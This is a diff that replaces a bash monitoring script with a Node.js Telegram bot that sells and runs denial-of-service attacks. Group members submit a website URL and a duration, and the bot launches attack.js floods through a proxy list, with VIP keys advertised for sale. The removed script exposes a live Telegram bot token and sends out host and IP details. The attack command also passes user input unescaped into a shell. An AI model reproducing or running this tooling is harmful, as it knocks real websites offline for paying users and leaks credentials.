@@ -1,125 +1,150 @@
-#!/bin/bash
+const TelegramBot = require('node-telegram-bot-api');
+const { exec } = require('child_process');
+const fs = require('fs');
 
-# Thông tin Telegram
-TELEGRAM_TOKEN="7828296793:AAEw4A7NI8tVrdrcR0TQZXyOpNSPbJmbGUU"
-CHAT_ID="7371969470"
-POLLING_INTERVAL=7
+const adminIdFile = 'adminid.txt', allowedGroupIdsFile = 'groupid.txt', blacklistFile = 'blacklist.txt', tokenFile = 'token.txt';
+let token, adminIds = new Set(), allowedGroupIds = new Set(), blacklist = [], botActive = true;
+let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {}, botStartTime = Date.now();
 
-# Hàm gửi tin nhắn qua Telegram
-send_telegram_message() {
-    local message=$1
-    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
-        -d chat_id="$CHAT_ID" \
-        -d text="$message" \
-        -d parse_mode="HTML" > /dev/null
-}
+// Load token, admin IDs, group IDs, and blacklist from files
+const loadConfig = () => {
+    try {
+        if (!fs.existsSync(tokenFile)) throw new Error('❌ File token.txt không tồn tại.');
+        token = fs.readFileSync(tokenFile, 'utf8').trim();
+        if (!token) throw new Error('❌ Token không hợp lệ.');
 
-# Hàm bỏ qua toàn bộ lệnh trước đó
-ignore_previous_commands() {
-    # Lấy update_id cuối cùng từ Telegram API
-    local last_update_id=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates" | jq -r '.result[-1].update_id')
-    
-    # Nếu có update_id, đặt offset lớn hơn last_update_id để bỏ qua tất cả lệnh trước đó
-    if [[ -n "$last_update_id" && "$last_update_id" != "null" ]]; then
-        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((last_update_id + 1))&timeout=0" > /dev/null
-    fi
-}
+        if (fs.existsSync(adminIdFile)) adminIds = new Set(fs.readFileSync(adminIdFile, 'utf8').split('\n').filter(id => id.trim()));
+        if (fs.existsSync(allowedGroupIdsFile)) allowedGroupIds = new Set(fs.readFileSync(allowedGroupIdsFile, 'utf8').split('\n').filter(id => id.trim()));
+        if (fs.existsSync(blacklistFile)) blacklist = fs.readFileSync(blacklistFile, 'utf8').split('\n').filter(url => url.trim());
 
-# Hàm kiểm tra lệnh từ Telegram
-check_telegram_command() {
-    local updates=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates")
-    local update_id=$(echo "$updates" | jq -r '.result[-1].update_id')
+        if (adminIds.size === 0) console.warn('⚠️ File adminid.txt trống hoặc không tồn tại.');
+        if (allowedGroupIds.size === 0) console.warn('⚠️ File groupid.txt trống hoặc không tồn tại.');
+        if (blacklist.length === 0) console.warn('⚠️ File blacklist.txt trống hoặc không tồn tại.');
+    } catch (err) {
+        console.error(err.message);
+        process.exit(1);
+    }
+};
 
-    if [[ -n "$update_id" && "$update_id" != "null" ]]; then
-        # Đặt offset lớn hơn update_id để bỏ qua lệnh này trong lần sau
-        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((update_id + 1))&timeout=0" > /dev/null
+loadConfig();
+const bot = new TelegramBot(token, { polling: true });
 
-        # Kiểm tra nếu có lệnh /stop
-        if echo "$updates" | grep -q "/stop"; then
-            send_telegram_message "Stopping all processes and monitoring."
-            # Dừng tất cả các tiến trình liên quan và exit
-            pkill -f -9 "rev.py|negan.py|prxscan.py|start.sh|monitor.sh|setup.sh"
-            # Dừng luôn cả việc polling bot
-            exit 1
-        fi
-    fi
-}
+const maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 300;
+const helpMessage = `📜 Hướng dẫn sử dụng:
+➔ Lệnh chính xác: <code>https://example.com 120</code>
+⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.
 
-# Hàm lấy thông tin hệ thống
-get_system_info() {
-    local os_name=$(grep PRETTY_NAME /etc/os-release | cut -d'"' -f2)
-    local hostname=$(hostname)
-    local ip_address=$(curl -s ifconfig.me)
-    local country=$(curl -s "http://ipinfo.io/$ip_address/country")
-    [[ "$country" == *"Rate limit exceeded"* ]] && country="Block Limit"
+🔐 Quyền hạn:
+- Admin: Có thể chỉ định thời gian tùy ý (tối đa ${maxTimeAttacks} giây), sử dụng lệnh <code>/pkill</code>, <code>/on</code>, <code>/off</code>.
+- Người dùng thường: Thời gian tối đa 120 giây, không thể sử dụng lệnh admin.
 
-    # Thông tin RAM
-    read -r total_ram_kb used_ram_kb <<< $(free -k | awk '/Mem:/ {print $2, $3}')
-    local total_ram_gb=$(echo "scale=2; $total_ram_kb / 1048576" | bc)
-    local used_ram_gb=$(echo "scale=2; $used_ram_kb / 1048576" | bc)
-    local ram_usage_percent=$(echo "scale=2; ($used_ram_kb / $total_ram_kb) * 100" | bc)
-    local ram_free_percent=$(echo "scale=2; 100 - $ram_usage_percent" | bc)
+💳 Mua Key VIP Ngày/Tuần/Tháng liên hệ: @adam022022.`;
 
-    # Định dạng lại giá trị RAM
-    local formatted_used_ram_gb=$(printf "%0.2f" $used_ram_gb)
+const sendHelp = (chatId, caller) => bot.sendMessage(chatId, `${caller ? `@${caller} ` : ''}${helpMessage}`, { parse_mode: 'HTML' });
 
-    # Thông tin CPU
-    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed 's/.*, *\([0-9.]*\)%* id.*/\1/' | awk '{print 100 - $1}')
-    local cpu_free=$(echo "scale=2; 100 - $cpu_usage" | bc)
-    local cpu_cores=$(lscpu | awk '/^CPU\(s\):/ {print $2}' 2>/dev/null || echo "Không xác định")
-    local cpu_cores_used=$(echo "scale=2; $cpu_usage / 100 * $cpu_cores" | bc)
-    local cpu_cores_free=$(echo "scale=2; $cpu_cores - $cpu_cores_used" | bc)
-    local cpu_cores_used_percent=$(echo "scale=2; ($cpu_cores_used / $cpu_cores) * 100" | bc)
-    local cpu_cores_free_percent=$(echo "scale=2; 100 - $cpu_cores_used_percent" | bc)
+const initBot = () => {
+    bot.on('message', async msg => {
+        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg;
+        const isAdmin = adminIds.has(userId.toString()), isGroup = allowedGroupIds.has(chatId.toString()), caller = username || first_name;
 
-    # Định dạng lại giá trị CPU cores
-    local formatted_cpu_cores_used=$(printf "%0.2f" $cpu_cores_used)
-    local formatted_cpu_cores_free=$(printf "%0.2f" $cpu_cores_free)
+        if (date * 1000 < botStartTime) return;
+        if (!isGroup) return bot.sendMessage(chatId, '❌ Bot chỉ hoạt động trong nhóm được cấp phép. Contact: @revenvenger', { parse_mode: 'HTML' });
+        if (!text) return;
 
-    # Thông tin đĩa cứng
-    local disk_usage=$(df -h / | awk 'NR==2 {print $3 "/" $2 " (" $5 " used)"}')
+        if (text === '/help') return sendHelp(chatId, caller);
 
-    # Thông tin GPU và thiết bị
-    local gpu_info="Không xác định"
-    if command -v lspci &> /dev/null; then
-        gpu_info=$(lspci | grep -i 'vga\|3d\|2d\|scsi' | sed 's/^[^ ]* //;s/ (.*$//' | head -n 1)
-        [[ -z "$gpu_info" ]] && gpu_info="Không có GPU/SCSI"
-    fi
+        if (text.startsWith('http')) {
+            if (!botActive) return bot.sendMessage(chatId, '❌ Bot hiện đang tắt. Chỉ admin có thể bật lại.', { parse_mode: 'HTML' });
 
-    # Thông tin tiến trình
-    local top_process=$(ps -eo pid,comm,%mem,%cpu --sort=-%cpu | awk 'NR==2')
-    local top_pid=$(echo "$top_process" | awk '{print $1}')
-    local top_cmd=$(echo "$top_process" | awk '{print $2}')
-    local top_mem=$(echo "$top_process" | awk '{print $3}')
-    local top_cpu=$(echo "$top_process" | awk '{print $4}')
+            const [host, time, full] = text.split(' ');
+            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });
 
-    # Thông tin uptime
-    local uptime=$(uptime -p | sed 's/up //')
+            // Kiểm tra blacklist
+            const isBlacklisted = blacklist.some(blackUrl => host.includes(blackUrl));
+            if (isBlacklisted) return bot.sendMessage(chatId, '❌ Link này đã bị chặn ở blacklist không thể thực hiện lệnh.', { parse_mode: 'HTML' });
 
-    # Tạo thông điệp
-    local message="🖥 Hệ điều hành BOTFREE NEGAN_REV ^^: $os_name
-📡 Hostname: $hostname
-🌐 IP: $ip_address (Quốc gia: $country)
-🏗 RAM: Tổng ${total_ram_gb}GB | Đã dùng ${formatted_used_ram_gb}GB (${ram_usage_percent}%) | Trống ${ram_free_percent}% |
-🧠 CPU: Sử dụng ${cpu_usage}% | Trống ${cpu_free}% |
-💻 Tổng số cores: $cpu_cores | Cores sử dụng: ${formatted_cpu_cores_used} (${cpu_cores_used_percent}%) | Cores trống: ${formatted_cpu_cores_free} (${cpu_cores_free_percent}%) 
-🔍 Tiến trình tiêu tốn tài nguyên nhất: PID $top_pid | Lệnh: $top_cmd | RAM: ${top_mem}% | CPU: ${top_cpu}% |
-💾 Đĩa cứng: $disk_usage
-🎮 GPU: $gpu_info
-⏳ Uptime: $uptime"
+            let attackTime = parseInt(time, 10);
+            if (isAdmin) attackTime = Math.min(attackTime, maxTimeAttacks);
+            else attackTime = Math.min(attackTime, 120);
 
-    echo "$message"
-}
+            if (userProcesses[userId] >= maxSlot) return bot.sendMessage(chatId, `❌ Bạn đã đạt giới hạn số lượng tiến trình (${maxSlot}).`);
+            if (currentProcesses >= maxCurrent) {
+                queue.push({ userId, host, time: attackTime, chatId, caller });
+                return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
+            }
 
-# Bỏ qua toàn bộ lệnh trước đó khi khởi động
-ignore_previous_commands
+            const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;
+            activeAttacks[pid] = { userId, endTime };
+            userProcesses[userId] = (userProcesses[userId] || 0) + 1;
+            currentProcesses++;
 
-# Vòng lặp chính
-while true; do
-    check_telegram_command
-    system_info=$(get_system_info)
-    send_telegram_message "$system_info"
-    echo "$system_info"
-    echo "----------------------------------------"
-    sleep $POLLING_INTERVAL
-done
+            const methods = full === 'full' && isAdmin ? ['GET', 'POST', 'HEAD'] : ['GET'];
+            const startMessage = JSON.stringify({
+                Status: "✨🚀🛸 Successfully 🛸🚀✨",
+                Caller: caller,
+                "PID Attack": pid,
+                Website: host,
+                Time: `${attackTime} Giây`,
+                Maxslot: maxSlot,
+                Maxtime: maxTimeAttacks,
+                Methods: methods.join(' '),
+                ConcurrentAttacks: currentProcesses,
+                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })
+            }, null, 2);
+
+            await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔍 Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: '🌐 Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });
+
+            let completedMethods = 0;
+            methods.forEach(method => {
+                exec(`node --max-old-space-size=8192 ./attack.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                    completedMethods++;
+                    if (completedMethods === methods.length) {
+                        const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
+                        bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
+                        delete activeAttacks[pid];
+                        userProcesses[userId]--;
+                        currentProcesses--;
+
+                        if (queue.length) {
+                            const next = queue.shift();
+                            bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
+                            bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
+                        }
+                    }
+                });
+            });
+            return;
+        }
+
+        if (text.startsWith('/pkill') || text.startsWith('/on') || text.startsWith('/off')) {
+            if (!isAdmin) return bot.sendMessage(chatId, '❌ Bạn không có quyền thực thi lệnh admin. Contact: @revenvenger', { parse_mode: 'HTML' });
+
+            if (text.startsWith('/pkill')) {
+                exec('pgrep -f attack.js', (e, stdout, stderr) => {
+                    if (e || !stdout.trim()) return bot.sendMessage(chatId, '❌ Không tìm thấy tiến trình đang chạy.', { parse_mode: 'HTML' });
+
+                    const pids = stdout.trim().split('\n').join(', ');
+                    exec(`pkill -f -9 attack.js`, (e, stdout, stderr) => {
+                        if (e) return bot.sendMessage(chatId, '❌ Lỗi khi thực hiện pkill.', { parse_mode: 'HTML' });
+                        bot.sendMessage(chatId, `✅ Đã kill hoàn toàn tiến trình. PID: ${pids}`, { parse_mode: 'HTML' });
+                    });
+                });
+                return;
+            }
+
+            if (text.startsWith('/on')) {
+                botActive = true;
+                bot.sendMessage(chatId, '✅ Bot đã được bật.', { parse_mode: 'HTML' });
+                return;
+            }
+
+            if (text.startsWith('/off')) {
+                botActive = false;
+                bot.sendMessage(chatId, '✅ Bot đã được tắt.', { parse_mode: 'HTML' });
+                return;
+            }
+        }
+    });
+};
+
+initBot();
